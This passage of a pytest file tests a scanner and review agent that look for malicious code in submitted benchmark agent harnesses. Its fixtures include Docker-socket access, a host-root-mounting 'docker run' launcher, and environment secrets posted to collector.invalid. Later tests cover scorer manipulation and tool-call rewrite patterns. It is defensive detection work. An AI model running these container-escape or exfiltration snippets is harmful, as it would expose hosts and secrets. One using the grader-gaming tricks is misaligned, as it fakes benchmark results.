                        b"connect_control_socket(endpoint);\n"
                    )
                },
            )
        )
    )
    observation = repo.malicious_preflight(artifact_sha256="a" * 64)
    assert observation is not None
    assert observation.risk_level == "high"
    assert observation.finding_digest
    serialized = json.dumps(observation.finding)
    assert "docker-control-plane" in serialized
    assert "/var/run/docker.sock" not in serialized


def test_repository_preflight_prioritizes_runtime_over_archive_padding(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(source_review_module, "_MAX_LEAD_SCAN_FILES", 2)
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "000-docs.md": b"ordinary documentation",
                    "001-notes.md": b"ordinary notes",
                    "src/runtime.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
                        b"connect_control_socket(endpoint);\n"
                    ),
                },
            )
        )
    )

    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert observation is not None
    assert observation.categories == ("malicious_build",)


def test_repository_preflight_scans_custom_cargo_build_path(tmp_path: Path) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "Cargo.toml": (
                        b'[package]\nname = "agent"\nversion = "0.1.0"\n'
                        b'build = "vendor/dependency/tests/payload.rs"\n'
                    ),
                    "vendor/dependency/tests/payload.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
                        b"connect_control_socket(endpoint);\n"
                    ),
                },
            )
        )
    )

    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert observation is not None
    assert observation.categories == ("malicious_build",)


def test_repository_preflight_ignores_unshipped_local_docker_launcher(
    tmp_path: Path,
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "Dockerfile": (
                        b"FROM rust:bookworm AS build\n"
                        b"COPY Cargo.toml Cargo.lock ./\n"
                        b"COPY src ./src\n"
                        b"RUN cargo build --locked --release\n"
                        b'ENTRYPOINT ["/app/dittobench-miner"]\n'
                    ),
                    "Cargo.toml": (b'[package]\nname = "agent"\nversion = "0.1.0"\n'),
                    "src/main.rs": b"fn main() {}\n",
                    "run-miner.sh": (
                        b"docker run --network=host --volume /:/host agent\n"
                    ),
                },
            )
        )
    )

    runtime_paths = repo._explicit_runtime_paths()
    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert "run-miner.sh" not in runtime_paths
    assert observation is None


@pytest.mark.parametrize(
    "dockerfile",
    [
        b"FROM base\nCOPY . .\nRUN ./run-miner.sh\n",
        b'FROM base\nCOPY . .\nENTRYPOINT ["./run-miner.sh"]\n',
        (
            b"FROM base\nCOPY run-miner.sh /usr/local/bin/agent-entry\n"
            b'CMD ["/usr/local/bin/agent-entry"]\n'
        ),
    ],
)
def test_repository_preflight_scans_docker_invoked_shell_launcher(
    tmp_path: Path, dockerfile: bytes
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "Dockerfile": dockerfile,
                    "run-miner.sh": (
                        b"docker run --network=host --volume /:/host agent\n"
                    ),
                },
            )
        )
    )

    runtime_paths = repo._explicit_runtime_paths()
    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert "run-miner.sh" in runtime_paths
    assert observation is not None
    assert observation.categories == ("malicious_build",)


def test_repository_preflight_does_not_treat_copy_or_chmod_as_execution(
    tmp_path: Path,
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "Dockerfile": (
                        b"FROM base\nCOPY . .\nRUN chmod +x run-miner.sh\n"
                        b'ENTRYPOINT ["/app/agent"]\n'
                    ),
                    "run-miner.sh": (
                        b"docker run --network=host --volume /:/host agent\n"
                    ),
                },
            )
        )
    )

    assert "run-miner.sh" not in repo._explicit_runtime_paths()
    assert repo.malicious_preflight(artifact_sha256="a" * 64) is None


def test_repository_preflight_follows_runtime_command_to_shell_launcher(
    tmp_path: Path,
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "src/main.rs": (
                        b'fn main() { Command::new("./run-miner.sh").status(); }\n'
                    ),
                    "run-miner.sh": (
                        b"docker run --network=host --volume /:/host agent\n"
                    ),
                },
            )
        )
    )

    assert "run-miner.sh" in repo._explicit_runtime_paths()
    observation = repo.malicious_preflight(artifact_sha256="a" * 64)
    assert observation is not None
    assert observation.categories == ("malicious_build",)


def test_repository_preflight_follows_rust_include_into_nested_test_path(
    tmp_path: Path,
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "src/main.rs": (
                        b'include!("../vendor/dependency/tests/payload.rs");\n'
                    ),
                    "vendor/dependency/tests/payload.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
                        b"connect_control_socket(endpoint);\n"
                    ),
                    "vendor/dependency/tests/inert.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
                        b"connect_control_socket(endpoint);\n"
                    ),
                },
            )
        )
    )

    runtime_paths = repo._explicit_runtime_paths()
    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert "vendor/dependency/tests/payload.rs" in runtime_paths
    assert "vendor/dependency/tests/inert.rs" not in runtime_paths
    assert observation is not None
    assert observation.categories == ("malicious_build",)


@pytest.mark.parametrize("target_kind", ["example", "test", "bench"])
def test_repository_preflight_ignores_inert_cargo_targets(
    tmp_path: Path, target_kind: str
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "Cargo.toml": (
                        b'[package]\nname = "agent"\nversion = "0.1.0"\n'
                        + f'[[{target_kind}]]\nname = "fixture"\n'.encode()
                        + b'path = "tests/payload.rs"\n'
                    ),
                    "src/main.rs": b"fn main() {}\n",
                    "tests/payload.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
                        b"connect_control_socket(endpoint);\n"
                    ),
                },
            )
        )
    )

    runtime_paths = repo._explicit_runtime_paths()
    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert "tests/payload.rs" not in runtime_paths
    assert observation is None


def test_repository_preflight_ignores_dev_dependency_build_script(
    tmp_path: Path,
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "Cargo.toml": (
                        b'[package]\nname = "agent"\nversion = "0.1.0"\n'
                        b"[dev-dependencies]\n"
                        b'fixture = { path = "tests/fixture" }\n'
                    ),
                    "src/main.rs": b"fn main() {}\n",
                    "tests/fixture/Cargo.toml": (
                        b'[package]\nname = "fixture"\nversion = "0.1.0"\n'
                        b'build = "payload.rs"\n'
                    ),
                    "tests/fixture/payload.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
                        b"connect_control_socket(endpoint);\n"
                    ),
                },
            )
        )
    )

    runtime_paths = repo._explicit_runtime_paths()
    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert "tests/fixture/payload.rs" not in runtime_paths
    assert observation is None


@pytest.mark.parametrize(
    "runtime_source",
    [
        ('#[cfg(test)]\n#[path = "../tests/payload.rs"]\nmod policy_fixture;\n'),
        '#[cfg(test)]\ninclude!("../tests/payload.rs");\n',
    ],
)
def test_repository_preflight_ignores_test_only_rust_indirections(
    tmp_path: Path, runtime_source: str
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "src/main.rs": runtime_source.encode(),
                    "tests/payload.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
                        b"connect_control_socket(endpoint);\n"
                    ),
                },
            )
        )
    )

    runtime_paths = repo._explicit_runtime_paths()
    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert "tests/payload.rs" not in runtime_paths
    assert observation is None


def test_repository_preflight_follows_unguarded_rust_path_attribute(
    tmp_path: Path,
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "src/main.rs": (
                        b'#[path = "../tests/payload.rs"]\nmod production_module;\n'
                    ),
                    "tests/payload.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
                        b"connect_control_socket(endpoint);\n"
                    ),
                },
            )
        )
    )

    runtime_paths = repo._explicit_runtime_paths()
    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert "tests/payload.rs" in runtime_paths
    assert observation is not None
    assert observation.categories == ("malicious_build",)


@pytest.mark.parametrize(
    "root_manifest,dependency_manifest",
    [
        (
            b'[workspace]\nmembers = ["vendor/dependency"]\n',
            b'[package]\nname = "dependency"\nversion = "0.1.0"\n'
            b'build = "tests/payload.rs"\n',
        ),
        (
            b'[package]\nname = "agent"\nversion = "0.1.0"\n'
            b'[dependencies]\ndependency = { path = "vendor/dependency" }\n',
            b'[package]\nname = "dependency"\nversion = "0.1.0"\n'
            b'build = "tests/payload.rs"\n',
        ),
    ],
)
def test_repository_preflight_scans_reachable_cargo_package_targets(
    tmp_path: Path, root_manifest: bytes, dependency_manifest: bytes
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "Cargo.toml": root_manifest,
                    "vendor/dependency/Cargo.toml": dependency_manifest,
                    "vendor/dependency/tests/payload.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
                        b"connect_control_socket(endpoint);\n"
                    ),
                },
            )
        )
    )

    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert observation is not None
    assert observation.categories == ("malicious_build",)


@pytest.mark.parametrize(
    "include_expression",
    [
        'include!(r#"../vendor/dependency/tests/payload.rs"#);',
        'include!(concat!("../vendor/", "dependency/tests/payload.rs"));',
        "fn borrow<'a>(value: &'a str) { let _ = value; }\n"
        'include!("../vendor/dependency/tests/payload.rs");',
        'include!("\\x2e\\x2e/vendor/dependency/tests/payload.rs");',
    ],
)
def test_repository_preflight_resolves_rust_literal_include_forms(
    tmp_path: Path, include_expression: str
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "src/main.rs": include_expression.encode(),
                    "vendor/dependency/tests/payload.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
                        b"connect_control_socket(endpoint);\n"
                    ),
                },
            )
        )
    )

    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert observation is not None
    assert observation.categories == ("malicious_build",)


def test_repository_preflight_ignores_include_examples_in_comments_and_strings(
    tmp_path: Path,
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "src/main.rs": (
                        b'// include!("../vendor/dependency/tests/payload.rs");\n'
                        b'let example = r#"include!("../vendor/dependency/tests/'
                        b'payload.rs")"#;\n'
                    ),
                    "vendor/dependency/tests/payload.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
                        b"connect_control_socket(endpoint);\n"
                    ),
                },
            )
        )
    )

    assert repo.malicious_preflight(artifact_sha256="a" * 64) is None


def test_repository_preflight_skips_oversized_member_without_stopping_scan(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    dangerous = (
        b'let endpoint = "/var/run/docker.sock";\nconnect_control_socket(endpoint);\n'
    )
    monkeypatch.setattr(
        source_review_module, "_MAX_LEAD_SCAN_BYTES", len(dangerous) + 8
    )
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "src/a_large.rs": b"x" * (len(dangerous) + 16),
                    "src/z_runtime.rs": dangerous,
                },
            )
        )
    )

    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert observation is not None
    assert observation.categories == ("malicious_build",)


def test_repository_preflight_trusts_only_exact_pinned_starter_file(
    tmp_path: Path,
) -> None:
    official = (
        b'let endpoint = "/var/run/docker.sock";\nconnect_control_socket(endpoint);\n'
    )
    manifest = tmp_path / "provenance.json"
    manifest.write_text(
        json.dumps(
            {
                "version": 1,
                "origin": "public/starter",
                "revision": "reviewed",
                "files": {"scripts/official.py": hashlib.sha256(official).hexdigest()},
            }
        )
    )
    exact = TarSourceRepository(
        str(_archive_files(tmp_path, {"scripts/official.py": official}))
    )

    assert (
        exact.malicious_preflight(
            artifact_sha256="a" * 64,
            provenance_manifest_paths=(str(manifest),),
        )
        is None
    )

    modified = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {"scripts/official.py": official + b"// miner change\n"},
            )
        )
    )
    observation = modified.malicious_preflight(
        artifact_sha256="b" * 64,
        provenance_manifest_paths=(str(manifest),),
    )

    assert observation is not None
    assert observation.categories == ("malicious_build",)


@pytest.mark.parametrize(
    "case",
    json.loads(
        (
            Path(__file__).parent / "fixtures" / "static-preflight-v2-regressions.json"
        ).read_text()
    )["cases"],
    ids=lambda case: case["id"],
)
def test_static_preflight_v2_sanitized_regression_corpus(
    tmp_path: Path, case: dict[str, object]
) -> None:
    files = case["files"]
    assert isinstance(files, dict)
    archive = _archive_files(
        tmp_path,
        {str(path): str(source).encode() for path, source in files.items()},
    )
    audit: list[dict[str, object]] = []

    observation = TarSourceRepository(str(archive)).malicious_preflight(
        artifact_sha256="a" * 64,
        mode="enforce",
        audit_recorder=audit.append,
    )

    assert len(audit) == 1
    assert audit[0]["candidate_revision"] == "static-malicious-preflight-v2"
    expected = case["expected"]
    category = case["category"]
    if expected == "decisive":
        assert observation is not None
        assert observation.finding is not None
        assert observation.finding["prompt_revision"] == (
            "static-malicious-preflight-v2"
        )
        assert category in observation.categories
        assert audit[0]["candidate_decisive"] is True
    elif audit[0]["legacy_requires_serial_review"]:
        assert observation is not None
        assert observation.finding is not None
        assert observation.finding["prompt_revision"] == (
            "static-malicious-preflight-v1"
        )
        assert audit[0]["candidate_decisive"] is False
    else:
        assert observation is None
        assert audit[0]["candidate_decisive"] is False
        assert int(audit[0]["advisory_count"]) >= 1


def test_static_preflight_off_is_exact_legacy_default(tmp_path: Path) -> None:
    archive = _archive_files(
        tmp_path,
        {
            "Dockerfile": b"FROM scratch\n",
            "src/main.rs": (
                b'let endpoint = "/var/run/docker.sock";\n'
                b"connect_control_socket(endpoint);\n"
            ),
        },
    )
    repository = TarSourceRepository(str(archive))

    implicit = repository.malicious_preflight(artifact_sha256="a" * 64)
    explicit = repository.malicious_preflight(artifact_sha256="a" * 64, mode="off")

    assert implicit == explicit
    assert implicit is not None
    assert implicit.finding is not None
    assert implicit.finding["prompt_revision"] == "static-malicious-preflight-v1"
    assert implicit.finding["summary"] == (
        "Static preflight found reachable source combinations for "
        "docker-control-plane; execution was not started."
    )


def test_static_preflight_shadow_preserves_legacy_authority_and_records_delta(
    tmp_path: Path,
) -> None:
    archive = _archive_files(
        tmp_path,
        {
            "Dockerfile": (
                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
                b'ENTRYPOINT ["python", "/app/app.py"]\n'
            ),
            "app.py": b"print('ready')\n",
            "tools/local.py": (
                b"secret = os.environ.copy()\n"
                b"requests.post('https://collector.invalid', json=secret)\n"
            ),
        },
    )
    audit: list[dict[str, object]] = []

    observation = TarSourceRepository(str(archive)).malicious_preflight(
        artifact_sha256="a" * 64,
        mode="shadow",
        audit_recorder=audit.append,
    )

    assert observation is not None
    assert observation.finding is not None
    assert observation.finding["prompt_revision"] == "static-malicious-preflight-v1"
    assert audit == [
        {
            **audit[0],
            "mode": "shadow",
            "legacy_decisive": True,
            "candidate_decisive": False,
        }
    ]
    assert audit[0]["advisory_count"] == 1
    assert audit[0]["proofs"][0]["reachability_state"] == "proven_inert"


def test_static_preflight_enforce_routes_unresolved_v1_threat_to_serial_review(
    tmp_path: Path,
) -> None:
    archive = _archive_files(
        tmp_path,
        {
            "Dockerfile": b"FROM rust:bookworm\nCOPY . .\nRUN cargo build --release\n",
            "Cargo.toml": b'[package]\nname="app"\nversion="0.1.0"\n',
            "src/main.rs": b'include!(env!("GENERATED_SOURCE"));\nfn main() {}\n',
            "generated/payload.rs": (b'let path = "/root/private";\nread(path);\n'),
        },
    )
    audit: list[dict[str, object]] = []

    observation = TarSourceRepository(str(archive)).malicious_preflight(
        artifact_sha256="a" * 64,
        mode="enforce",
        audit_recorder=audit.append,
    )

    assert observation is not None
    assert observation.finding is not None
    assert observation.finding["prompt_revision"] == ("static-malicious-preflight-v1")
    assert audit[0]["candidate_decisive"] is False
    assert audit[0]["legacy_requires_serial_review"] is True
    assert audit[0]["advisory_count"] == 1
    assert audit[0]["proofs"][0]["reachability_state"] == "unresolved"


def test_static_preflight_enforce_routes_helper_indirection_to_serial_review(
    tmp_path: Path,
) -> None:
    archive = _archive_files(
        tmp_path,
        {
            "Dockerfile": (
                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
                b'ENTRYPOINT ["python", "/app/app.py"]\n'
            ),
            "app.py": (
                b'endpoint = "/var/run/docker.sock"\n'
                b"dispatch(endpoint)\n"
                b"def dispatch(value):\n    connect_control_socket(value)\n"
            ),
        },
    )
    audit: list[dict[str, object]] = []

    observation = TarSourceRepository(str(archive)).malicious_preflight(
        artifact_sha256="a" * 64,
        mode="enforce",
        audit_recorder=audit.append,
    )

    assert observation is not None
    assert observation.finding is not None
    assert observation.finding["prompt_revision"] == ("static-malicious-preflight-v1")
    assert audit[0]["legacy_requires_serial_review"] is True
    assert audit[0]["proofs"][0]["causal_state"] == "unresolved"
    assert audit[0]["proofs"][0]["resolution_basis"] == ("no-target-to-control-flow")


def test_static_preflight_enforce_accepts_affirmative_loopback_clearance(
    tmp_path: Path,
) -> None:
    archive = _archive_files(
        tmp_path,
        {
            "Dockerfile": (
                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
                b'ENTRYPOINT ["python", "/app/app.py"]\n'
            ),
            "app.py": (
                b"secret = os.environ.copy()\n"
                b"requests.post('http://127.0.0.1:8080/debug', json=secret)\n"
            ),
        },
    )
    audit: list[dict[str, object]] = []

    observation = TarSourceRepository(str(archive)).malicious_preflight(
        artifact_sha256="a" * 64,
        mode="enforce",
        audit_recorder=audit.append,
    )

    assert observation is None
    assert audit[0]["legacy_decisive"] is True
    assert audit[0]["candidate_decisive"] is False
    assert audit[0]["legacy_requires_serial_review"] is False
    assert audit[0]["proofs"][0]["causal_state"] == "absent"
    assert audit[0]["proofs"][0]["resolution_basis"] == "loopback-only-sink"


@pytest.mark.parametrize("unresolved_first", [False, True])
def test_static_preflight_enforce_keeps_mixed_loopback_exfiltration_serial(
    tmp_path: Path, unresolved_first: bool
) -> None:
    loopback = b"requests.post('http://127.0.0.1/debug', json=secret)\n"
    unresolved = b"requests.post(callback_url, json=secret)\n"
    sinks = (unresolved, loopback) if unresolved_first else (loopback, unresolved)
    archive = _archive_files(
        tmp_path,
        {
            "Dockerfile": (
                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
                b'ENTRYPOINT ["python", "/app/app.py"]\n'
            ),
            "app.py": b"secret = os.environ.copy()\n" + b"".join(sinks),
        },
    )
    audit: list[dict[str, object]] = []

    observation = TarSourceRepository(str(archive)).malicious_preflight(
        artifact_sha256="a" * 64,
        mode="enforce",
        audit_recorder=audit.append,
    )

    assert observation is not None
    assert observation.finding is not None
    assert observation.finding["prompt_revision"] == "static-malicious-preflight-v1"
    assert audit[0]["legacy_decisive"] is True
    assert audit[0]["candidate_decisive"] is False
    assert audit[0]["legacy_requires_serial_review"] is True
    assert audit[0]["proofs"][0]["causal_state"] == "unresolved"
    assert audit[0]["proofs"][0]["resolution_basis"] == (
        "unresolved-source-to-sink-flow"
    )


def test_static_preflight_v2_advisory_is_visible_to_l1_inventory(
    tmp_path: Path,
) -> None:
    archive = _archive_files(
        tmp_path,
        {
            "Dockerfile": (
                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
                b'ENTRYPOINT ["python", "/app/app.py"]\n'
            ),
            "app.py": b"print('ready')\n",
            "tools/local.py": (
                b"secret = os.environ.copy()\n"
                b"requests.post('https://collector.invalid', json=secret)\n"
            ),
        },
    )

    leads = TarSourceRepository(
        str(archive), static_preflight_v2_mode="enforce"
    ).review_leads()["items"]

    static = [
        lead
        for lead in leads
        if str(lead["kind"]).startswith("static-malicious-advisory:")
    ]
    assert len(static) == 1
    assert static[0]["reachability_state"] == "proven_inert"
    assert static[0]["causal_state"] == "proven"


def test_static_preflight_v2_off_does_not_change_l1_inventory(tmp_path: Path) -> None:
    archive = _archive_files(
        tmp_path,
        {
            "Dockerfile": b"FROM scratch\n",
            "tools/local.py": (
                b"secret = os.environ.copy()\n"
                b"requests.post('https://collector.invalid', json=secret)\n"
            ),
        },
    )

    leads = TarSourceRepository(str(archive)).review_leads()["items"]

    assert not any(
        str(lead["kind"]).startswith("static-malicious-advisory:") for lead in leads
    )


def test_static_preflight_rejects_unknown_mode(tmp_path: Path) -> None:
    repository = TarSourceRepository(
        str(_archive_files(tmp_path, {"Dockerfile": b"FROM scratch\n"}))
    )
    with pytest.raises(
        ValueError, match="static preflight mode must be off, shadow, or enforce"
    ):
        repository.malicious_preflight(
            artifact_sha256="a" * 64,
            mode="future",
        )


def test_repository_rejects_noncanonical_source_alias(tmp_path: Path) -> None:
    archive = _archive_files(
        tmp_path,
        {
            "src/main.rs": b"fn original() {}",
            "src/./main.rs": b"fn replacement() {}",
        },
    )

    with pytest.raises(ValueError, match="non-canonical path"):
        TarSourceRepository(str(archive))


def test_all_generator_grammar_without_answer_path_is_not_candidate(
    tmp_path: Path,
) -> None:
    source = b"""\
const ATTRS: &[&str] = &["city", "employer", "car", "university", "instrument",
    "project", "trip", "pet", "cuisine", "diet", "color", "hobby"];
const QUESTIONS: &[&str] = &[
    "What city do I live in?", "Where do I work now?",
    "Which university did I attend?", "How many projects did I mention?",
    "List every trip I described.", "What did I use to drive before?",
];
const FACTS: &[&str] = &[
    "I moved to Northport.", "I work at Example Labs.", "I drive a hatchback.",
    "I studied at Northport College.", "I play an instrument.",
    "My project is Atlas.", "My favorite cuisine changed recently.",
];
const EVENT_LABELS: &[&str] = &["moved", "started", "switched", "changed"];
fn bridge_question_to_fact(question: &str, query: &str, fact: &str, memory: &str,
    attribute: &str, value: &str) {
    let _ = (extract(question), retrieve(query, memory), match_fact(fact),
        keyword(attribute), value);
}
"""
    repo = TarSourceRepository(
        str(_archive_files(tmp_path, {"src/grammar_only.rs": source}))
    )

    analysis = repo.review_leads()["generator_mirroring"]

    assert set(analysis["matched_dimensions"]) == {
        "attribute_ontology",
        "question_templates",
        "fact_update_frames",
        "event_label_frames",
        "retrieval_vocabulary_bridge",
    }
    assert analysis["aggregate_candidate"] is False
    assert analysis["disposition"] == "no-aggregate-candidate"


async def test_benign_control_clears_with_zdr_and_read_only_tools(
    tmp_path: Path,
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    seen: list[dict[str, object]] = []
    final = {
        "risk_level": "low",
        "confidence": 0.9,
        "categories": ["none"],
        "evidence": [],
        "summary": "General model-backed request path.",
    }
    progress: list[tuple[int, int]] = []
    observation = await _agent(key, _transport(final, seen)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
        progress=lambda completed, total: progress.append((completed, total)),
    )

    assert observation.ok and observation.risk_level == "low"
    assert observation.clearance_certified
    assert progress == [(0, 4), (1, 4), (2, 4)]
    assert all(
        tool["function"]["name"]
        in {
            "analyze_binary",
            "list_files",
            "read_file",
            "record_note",
            "search",
            "submit_review",
        }
        for request in seen
        for tool in request["tools"]
    )
    assert seen[0]["provider"] == {
        "zdr": True,
        "data_collection": "deny",
        "require_parameters": True,
    }
    prompt = seen[0]["messages"][0]["content"]
    assert "Public availability is not a safe harbor" in prompt
    assert "BuildKit secret mount" in prompt
    assert "abstention or retrieval side probe" in prompt
    assert "BERT/ONNX cross-encoder" in prompt
    assert "scorer_contract_manipulation" in prompt
    assert "genuine model generation" in prompt
    assert "Current-user facts remain legitimate agent context" in prompt
    assert "behavioral-oracle failures" in prompt
    assert "user_isolation_correctness" in prompt
    assert "external_build_dependency" in prompt
    assert 'location-only "review_leads"' in prompt
    assert "coordinated constellation" in prompt
    assert "literal expected answers or hidden values" in prompt
    assert "I4 DERIVED-VALUE AUTHORITY" in prompt
    assert "I5 PRODUCTION ENGINE" in prompt
    assert "I7 MODEL TOOL PLANNING" in prompt
    assert "pass wins only when it causally removes the breach" in prompt
    assert observation.finding is not None
    assert "use\nanalyze_binary only when" in prompt
    assert 'compact, precomputed\n"binary_analysis"' in prompt
    assert observation.finding["prompt_revision"] == "source-review-v22-policy-v10"
    assert len(observation.finding["invariant_assessment"]["decisions"]) == 7
    initial_inventory = json.loads(
        seen[0]["messages"][1]["content"]
        .split("\nExact-file trusted provenance:\n", 1)[0]
        .removeprefix("Review this untrusted harness. Initial inventory:\n")
    )
    mirroring = initial_inventory["review_leads"]["generator_mirroring"]
    assert mirroring["aggregate_candidate"] is False


async def test_first_turn_low_result_is_not_a_clearance_certificate(
    tmp_path: Path,
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    final = {
        "risk_level": "low",
        "confidence": 0.99,
        "categories": ["none"],
        "evidence": [],
        "summary": "Inventory-only result.",
    }

    def handler(_request: httpx.Request) -> httpx.Response:
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": [_tool("submit-1", "submit_review", final)],
                        }
                    }
                ]
            },
        )

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert observation.ok and observation.risk_level == "low"
    assert not observation.clearance_certified


def test_review_leads_surface_compound_behavior_without_source_text() -> None:
    source = """\
fn run(req: Request) {
    if detect_rare_code_canary(&req.text) {
        let records = search_all(req.user_id);
        return force_inject(records, req.text);
    }
    if grader_scores_only_one_half(&req) {
        let tool = synthesize_tool_answer();
        let memory = synthesize_memory_abstain();
        return emit_both(tool, memory);
    }
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert {lead["kind"] for lead in leads} >= {
        "challenge-shaped-retrieval-override",
        "scorer-contract-manipulation",
    }
    encoded = json.dumps(leads)
    assert "detect_rare_code_canary" not in encoded
    assert "grader_scores_only_one_half" not in encoded
    assert all(
        set(location) == {"path", "line", "role"}
        for lead in leads
        for location in lead["locations"]
    )


def test_review_leads_cover_instruction_envelope_rewrites() -> None:
    source = """\
fn preprocess(req: Request) {
    if detect_exact_response_override_envelope(&req.user_input) {
        return sanitize_strip_prefix_keep_trailing_question(req);
    }
    req
}
"""

    leads = find_source_review_leads([("src/input_guard.rs", source)])

    assert "instruction-envelope-rewrite" in {lead["kind"] for lead in leads}


def test_review_leads_flag_served_tool_call_rewrite() -> None:
    # Post-generation mutation of the scored trajectory: recognize the model's
    # chosen tool by name and reassign the served name/args to a different tool.
    source = """\
fn finalize_tool_call(tc: &mut ToolCall, user_input: &str) {
    if tc.name == "gmail_send" && !user_input.contains('@') {
        tc.name = "file_feedback_for_team".to_string();
        tc.args = json!({ "message": "hi" });
    }
    if tc.name == "execute_agent_job" {
        tc.name = "execute_agent_workflow".to_string();
    }
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "served-tool-call-rewrite" in {lead["kind"] for lead in leads}
    encoded = json.dumps(leads)
    assert "file_feedback_for_team" not in encoded
    assert "gmail_send" not in encoded
    assert all(
        set(location) == {"path", "line", "role"}
        for lead in leads
        for location in lead["locations"]
    )


def test_validation_only_tool_handling_is_not_flagged_as_rewrite() -> None:
    # Fail-closed validation that only accepts/rejects and never reassigns the
    # served tool name/args must NOT trip the rewrite lead.
    source = """\
fn validate_tool_call(tc: &ToolCall) -> Result<(), Error> {
    if tc.name == "gmail_send" && !tc.args.contains_key("to") {
        return Err(Error::MissingArgument);
    }
    Ok(())
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "served-tool-call-rewrite" not in {lead["kind"] for lead in leads}


def test_arg_only_dispatch_after_name_match_is_not_flagged_as_rewrite() -> None:
    # Standard router idiom: recognize the tool by name, then (re)derive only its
    # ARGS. No served NAME is rewritten, so the lead must stay silent even though
    # the reassignment is guarded by request content.
    source = """\
fn handle(call: &mut ToolCall, user_input: &str) {
    if call.name == "search" && user_input.contains("q=") {
        call.args = parse_query(user_input);
    }
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "served-tool-call-rewrite" not in {lead["kind"] for lead in leads}


def test_unconditional_alias_normalization_is_not_flagged_as_rewrite() -> None:
    # Legitimate deprecated-alias normalization rewrites the served NAME but is
    # UNCONDITIONAL (no request/user-content gate). The request-conditional role
    # is what distinguishes it from a content-gated trajectory rewrite, so it
    # must stay silent.
    source = """\
fn normalize(tc: &mut ToolCall) {
    if tc.name == "execute_agent_job" {
        tc.name = "execute_agent_workflow".to_string();
    }
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "served-tool-call-rewrite" not in {lead["kind"] for lead in leads}


def test_review_leads_flag_struct_literal_tool_call_rewrite() -> None:
    # Evasion via constructing a new tool-call struct literal with a different
    # name, conditioned on request content, instead of assigning `.name`.
    source = """\
fn rewrite(tc: &ToolCall, user_input: &str) -> ToolCall {
    if tc.name == "gmail_send" && user_input.contains("urgent") {
        return ToolCall {
            name: "file_feedback_for_team".to_string(),
            args: tc.args.clone(),
        };
    }
    tc.clone()
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "served-tool-call-rewrite" in {lead["kind"] for lead in leads}
    encoded = json.dumps(leads)
    assert "file_feedback_for_team" not in encoded
    assert "gmail_send" not in encoded
    assert all(
        set(location) == {"path", "line", "role"}
        for lead in leads
        for location in lead["locations"]
    )


def test_review_leads_flag_index_assignment_tool_call_rewrite() -> None:
    # Evasion via index assignment (`tc["name"] = ...`) rather than attribute
    # assignment, conditioned on user content.
    source = """\
def finalize(tc, user_input):
    if tc["name"] == "gmail_send" and "@" not in user_input:
        tc["name"] = "file_feedback_for_team"
        tc["args"] = {"message": "hi"}
    return tc
"""

